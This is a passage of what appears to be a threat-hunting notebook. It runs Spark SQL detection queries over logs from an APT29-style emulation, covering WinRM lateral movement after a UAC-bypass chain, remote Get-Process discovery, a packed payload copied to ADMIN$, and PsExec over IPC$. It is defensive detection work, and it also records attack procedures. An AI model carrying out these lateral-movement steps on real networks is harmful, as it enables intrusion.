Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.1.4
SourceHostname: -
SourcePort: 59959
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 10.0.1.6
DestinationHostname: -
DestinationPort: 5985
DestinationPortName: - 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:0376E07E-3C48-4B89-A50D-B3FAAB23EDAB</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT f.Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT split(d.NewProcessId, &#39;0x&#39;)[1] as NewProcessId</span>
<span class="sd">    FROM apt29Host d</span>
<span class="sd">    INNER JOIN(</span>
<span class="sd">      SELECT a.ProcessId, a.NewProcessId</span>
<span class="sd">      FROM apt29Host a</span>
<span class="sd">      INNER JOIN (</span>
<span class="sd">        SELECT NewProcessId</span>
<span class="sd">        FROM apt29Host</span>
<span class="sd">        WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">            AND EventID = 4688</span>
<span class="sd">            AND LOWER(NewProcessName) LIKE &quot;%control.exe&quot;</span>
<span class="sd">            AND LOWER(ParentProcessName) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">      ) b</span>
<span class="sd">      ON a.ProcessId = b.NewProcessId</span>
<span class="sd">      WHERE LOWER(a.Channel) = &quot;security&quot;</span>
<span class="sd">        AND a.EventID = 4688</span>
<span class="sd">        AND a.MandatoryLabel = &quot;S-1-16-12288&quot;</span>
<span class="sd">        AND a.TokenElevationType = &quot;%%1937&quot;</span>
<span class="sd">    ) c</span>
<span class="sd">    ON d.ProcessId = c.NewProcessId</span>
<span class="sd">    WHERE LOWER(d.Channel) = &quot;security&quot;</span>
<span class="sd">      AND d.EventID = 4688</span>
<span class="sd">      AND d.NewProcessName LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON LOWER(hex(CAST(f.ProcessId as INT))) = e.NewProcessId</span>
<span class="sd">WHERE LOWER(f.Channel) = &quot;security&quot;</span>
<span class="sd">    AND EventID = 5156</span>
<span class="sd">    AND DestPort = 5985</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		3852
	Application Name:	\device\harddiskvolume2\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.4
	Source Port:		59962
	Destination Address:	10.0.1.6
	Destination Port:		5985
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	68659
	Layer Name:		Connect
	Layer Run-Time ID:	48 
-RECORD 1--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		3852
	Application Name:	\device\harddiskvolume2\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.4
	Source Port:		59961
	Destination Address:	10.0.1.6
	Destination Port:		5985
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	68659
	Layer Name:		Connect
	Layer Run-Time ID:	48 
-RECORD 2--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		3852
	Application Name:	\device\harddiskvolume2\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.4
	Source Port:		59960
	Destination Address:	10.0.1.6
	Destination Port:		5985
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	68659
	Layer Name:		Connect
	Layer Run-Time ID:	48 
-RECORD 3--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		3852
	Application Name:	\device\harddiskvolume2\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.4
	Source Port:		59959
	Destination Address:	10.0.1.6
	Destination Port:		5985
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	68659
	Layer Name:		Connect
	Layer Run-Time ID:	48 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="a-3-process-discovery">
<h2>8.A.3. Process Discovery<a class="headerlink" href="#a-3-process-discovery" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Enumerated processes on remote host Scranton (10.0.1.4) using PowerShell</p>
<p><strong>Criteria:</strong> powershell.exe executing Get-Process</p>
<div class="section" id="id56">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id56" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:6C481791-2AE8-4F6B-9BFE-C1F6DE1E0BC0</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT b.ScriptBlockText</span>
<span class="sd">FROM apt29Host b</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT ProcessGuid, ProcessId</span>
<span class="sd">    FROM apt29Host</span>
<span class="sd">    WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND EventID = 1</span>
<span class="sd">    AND LOWER(Image) LIKE &#39;%wsmprovhost.exe&#39;</span>
<span class="sd">) a</span>
<span class="sd">ON b.ExecutionProcessID = a.ProcessId</span>
<span class="sd">WHERE b.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">  AND b.EventID = 4104</span>
<span class="sd">  AND LOWER(b.ScriptBlockText) LIKE &quot;%get-process%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ScriptBlockText |  Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like &quot;*\$env:USERNAME&quot; } | Sort-Object SessionId -Unique  
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:088846AF-FF45-4FC4-896C-64F24517BBD7</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT b.ScriptBlockText</span>
<span class="sd">FROM apt29Host b</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT split(NewProcessId, &#39;0x&#39;)[1] as NewProcessId</span>
<span class="sd">    FROM apt29Host</span>
<span class="sd">    WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">      AND EventID = 4688</span>
<span class="sd">      AND LOWER(NewProcessName) LIKE &#39;%wsmprovhost.exe&#39;</span>
<span class="sd">) a</span>
<span class="sd">ON LOWER(hex(b.ExecutionProcessID)) = a.NewProcessId</span>
<span class="sd">WHERE b.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">AND b.EventID = 4104</span>
<span class="sd">AND LOWER(b.ScriptBlockText) LIKE &quot;%get-process%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ScriptBlockText |  Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like &quot;*\$env:USERNAME&quot; } | Sort-Object SessionId -Unique  
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="b-1-remote-file-copy">
<h2>8.B.1. Remote File Copy<a class="headerlink" href="#b-1-remote-file-copy" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Copied python.exe payload from a WebDAV share (192.168.0.4) to remote host Scranton (10.0.1.4)</p>
<p><strong>Criteria:</strong> The file python.exe created on Scranton (10.0.1.4)</p>
<div class="section" id="id57">
<h3>Detection Type:Telemetry(None)<a class="headerlink" href="#id57" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:97402495-2449-415F-BDAD-5CC8EFC1E1B5</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host</span>
<span class="sd">WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">  AND EventID = 5145</span>
<span class="sd">  AND RelativeTargetName LIKE &#39;%python.exe&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x861A79

Network Information:	
	Object Type:		File
	Source Address:		10.0.1.4
	Source Port:		59967
	
Share Information:
	Share Name:		\\*\ADMIN$
	Share Path:		\??\C:\windows
	Relative Target Name:	Temp\python.exe

Access Request Information:
	Access Mask:		0x80
	Accesses:		ReadAttributes
				
Access Check Results:
	-
                                                                                                                                                                                                                                         
-RECORD 1----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x861A79

Network Information:	
	Object Type:		File
	Source Address:		10.0.1.4
	Source Port:		59967
	
Share Information:
	Share Name:		\\*\ADMIN$
	Share Path:		\??\C:\windows
	Relative Target Name:	Temp\python.exe

Access Request Information:
	Access Mask:		0x17019F
	Accesses:		DELETE
				READ_CONTROL
				WRITE_DAC
				SYNCHRONIZE
				ReadData (or ListDirectory)
				WriteData (or AddFile)
				AppendData (or AddSubdirectory or CreatePipeInstance)
				ReadEA
				WriteEA
				ReadAttributes
				WriteAttributes
				
Access Check Results:
	-
 
-RECORD 2----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x861A79

Network Information:	
	Object Type:		File
	Source Address:		10.0.1.4
	Source Port:		59967
	
Share Information:
	Share Name:		\\*\ADMIN$
	Share Path:		\??\C:\windows
	Relative Target Name:	Temp\python.exe

Access Request Information:
	Access Mask:		0x2
	Accesses:		WriteData (or AddFile)
				
Access Check Results:
	-
                                                                                                                                                                                                                                  
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:D804F2D8-C65B-42D6-A731-C13BE2BDB441</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host</span>
<span class="sd">WHERE Channel = &#39;Microsoft-Windows-Sysmon/Operational&#39;</span>
<span class="sd">    AND EventID = 11</span>
<span class="sd">    AND TargetFilename LIKE &#39;%python.exe&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | File created:
RuleName: -
UtcTime: 2020-05-02 03:10:23.626
ProcessGuid: {5aa8ec29-cad1-5eac-0100-000000000400}
ProcessId: 4
Image: System
TargetFilename: C:\Windows\Temp\python.exe
CreationUtcTime: 2020-05-02 03:10:23.626 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="b-2-software-packing">
<h2>8.B.2. Software Packing<a class="headerlink" href="#b-2-software-packing" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> python.exe payload was packed with UPX</p>
<p><strong>Criteria:</strong> Evidence that the file python.exe is packed</p>
<div class="section" id="id58">
<h3>Detection Type:None(None)<a class="headerlink" href="#id58" title="Permalink to this headline">¶</a></h3>
</div>
</div>
<div class="section" id="c-1-valid-accounts">
<h2>8.C.1. Valid Accounts<a class="headerlink" href="#c-1-valid-accounts" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Logged on to remote host NASHUA (10.0.1.6) using valid credentials for user Pam</p>
<p><strong>Criteria:</strong> Successful logon as user Pam on NASHUA (10.0.1.6)</p>
<div class="section" id="id59">
<h3>Detection Type:Telemetry(None)<a class="headerlink" href="#id59" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:AF5E8E22-DEC8-40AF-98AD-84BE1AC3F34C</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Hostname, a.Message</span>
<span class="sd">FROM apt29Host b</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT TargetLogonId, Message</span>
<span class="sd">    FROM apt29Host</span>
<span class="sd">    WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">        AND EventID = 4624</span>
<span class="sd">        AND LogonType = 3</span>
<span class="sd">        AND TargetUserName NOT LIKE &#39;%$&#39;</span>
<span class="sd">) a</span>
<span class="sd">ON b.SubjectLogonId = a.TargetLogonId</span>
<span class="sd">WHERE LOWER(b.Channel) = &quot;security&quot;</span>
<span class="sd">  AND b.EventID = 5145</span>
<span class="sd">  AND b.RelativeTargetName LIKE &#39;%python.exe&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Hostname | NASHUA.dmevals.local                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
 Message  | An account was successfully logged on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS.LOCAL
	Logon ID:		0x861A79
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{d2e3bf90-d0c7-9b80-942b-c7b9cbec384a}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	10.0.1.4
	Source Port:		59967

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested. 
-RECORD 1--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Hostname | NASHUA.dmevals.local                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
 Message  | An account was successfully logged on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS.LOCAL
	Logon ID:		0x861A79
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{d2e3bf90-d0c7-9b80-942b-c7b9cbec384a}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	10.0.1.4
	Source Port:		59967

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested. 
-RECORD 2--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Hostname | NASHUA.dmevals.local                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
 Message  | An account was successfully logged on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS.LOCAL
	Logon ID:		0x861A79
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{d2e3bf90-d0c7-9b80-942b-c7b9cbec384a}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	10.0.1.4
	Source Port:		59967

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested. 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="c-2-windows-admin-shares">
<h2>8.C.2. Windows Admin Shares<a class="headerlink" href="#c-2-windows-admin-shares" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Established SMB session to remote host NASHUA’s (10.0.1.6) IPC$ share using PsExec</p>
<p><strong>Criteria:</strong> SMB session to NASHUA (10.0.1.6) over TCP port 445/135 OR evidence of usage of a Windows share</p>
<div class="section" id="id60">
<h3>Detection Type:Telemetry(None)<a class="headerlink" href="#id60" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:C91A4BF2-22B1-421B-B1DE-626778AD3BBB</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT EventTime, Hostname, ShareName, RelativeTargetName, SubjectUserName</span>
<span class="sd">FROM apt29Host</span>
<span class="sd">WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">  AND EventID = 5145</span>
<span class="sd">  AND ShareName LIKE &#39;%IPC%&#39;</span>
<span class="sd">  AND RelativeTargetName LIKE &#39;%PSEXESVC%&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-------------------------------------------
 EventTime          | 2020-05-01 23:11:40           
 Hostname           | NASHUA.dmevals.local          
 ShareName          | \\*\IPC$                      
 RelativeTargetName | PSEXESVC                      
 SubjectUserName    | pbeesly                       
-RECORD 1-------------------------------------------
 EventTime          | 2020-05-01 23:11:40           
 Hostname           | NASHUA.dmevals.local          
 ShareName          | \\*\IPC$                      
 RelativeTargetName | PSEXESVC-SCRANTON-2668-stdin  
 SubjectUserName    | pbeesly                       
-RECORD 2-------------------------------------------
 EventTime          | 2020-05-01 23:11:40           
 Hostname           | NASHUA.dmevals.local          
 ShareName          | \\*\IPC$                      
 RelativeTargetName | PSEXESVC-SCRANTON-2668-stdout 
 SubjectUserName    | pbeesly                       
-RECORD 3-------------------------------------------
 EventTime          | 2020-05-01 23:11:40           
 Hostname           | NASHUA.dmevals.local          
 ShareName          | \\*\IPC$                      
 RelativeTargetName | PSEXESVC-SCRANTON-2668-stderr 
 SubjectUserName    | pbeesly                       
-RECORD 4-------------------------------------------
 EventTime          | 2020-05-01 23:12:46           
 Hostname           | NASHUA.dmevals.local          
 ShareName          | \\*\IPC$                      
 RelativeTargetName | PSEXESVC                      
 SubjectUserName    | pbeesly                       
-RECORD 5-------------------------------------------
 EventTime          | 2020-05-01 23:12:46           
 Hostname           | NASHUA.dmevals.local          
 ShareName          | \\*\IPC$                      
 RelativeTargetName | PSEXESVC-SCRANTON-5924-stdin  
 SubjectUserName    | pbeesly                       
-RECORD 6-------------------------------------------
 EventTime          | 2020-05-01 23:12:46           
 Hostname           | NASHUA.dmevals.local          
 ShareName          | \\*\IPC$                      
 RelativeTargetName | PSEXESVC-SCRANTON-5924-stdout 
 SubjectUserName    | pbeesly                       
-RECORD 7-------------------------------------------
 EventTime          | 2020-05-01 23:12:46           
 Hostname           | NASHUA.dmevals.local          
